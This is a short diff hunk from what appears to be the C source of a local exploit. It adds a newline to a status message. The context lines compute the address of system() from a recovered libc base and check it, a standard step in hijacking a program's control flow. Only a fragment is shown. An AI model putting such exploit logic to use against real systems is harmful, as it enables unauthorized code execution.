@@ -591,7 +591,7 @@ int main(int argc, char **argv, char **env)
 
 	if(check_libc_base()) {
 		system_ptr = libc_base + (system_ptr & 0x000fffff);
-		printf("[*] Creating more creep 0x%08x ...", system_ptr);
+		printf("[*] Creating more creep 0x%08x ...\n", system_ptr);
 
 		if (check_addr(system_ptr) == -1) {
 			printf("[-] High templars, we're doomed!\n");
